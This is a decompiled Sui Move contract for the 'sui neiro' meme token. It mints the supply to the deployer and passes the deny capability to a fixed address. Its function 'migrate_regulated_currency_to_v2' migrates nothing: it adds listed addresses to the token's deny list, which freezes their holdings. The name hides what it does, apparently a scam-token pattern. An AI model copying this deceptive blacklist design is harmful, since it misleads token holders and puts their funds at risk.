module 0x42865cba93bb0dbac0efee272aef38cfdba9775f0befaf03652357073a28ddc8::NEIRO {
    struct NEIRO has drop {
        dummy_field: bool,
    }

    fun init(arg0: NEIRO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency<NEIRO>(arg0, 2, b"sui neiro", b"sui neiro", b"sui neiro", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://arweave.net/lH9Gl1uwnpkKzCm2NEo2xhAr6VGNLQMVcvvmbwxaGqk?ext=png")), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NEIRO>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCap<NEIRO>>(v1, @0x8bcc0e6cadf05f36018b1dff59d669b358a5aad6e5d05ad00bda60873cf0cb5c);
        let v3 = v0;
        0x2::coin::mint_and_transfer<NEIRO>(&mut v3, 420690000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<NEIRO>>(v3, 0x2::tx_context::sender(arg1));
    }

    entry fun migrate_regulated_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCap<NEIRO>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        while (v0 < 0x1::vector::length<address>(&mut arg2)) {
            let v1 = 0x1::vector::pop_back<address>(&mut arg2);
            if (!0x2::coin::deny_list_contains<NEIRO>(arg0, v1)) {
                0x2::coin::deny_list_add<NEIRO>(arg0, arg1, v1, arg3);
            };
            v0 = v0 + 1;
        };
    }

    // decompiled from Move bytecode v6
}

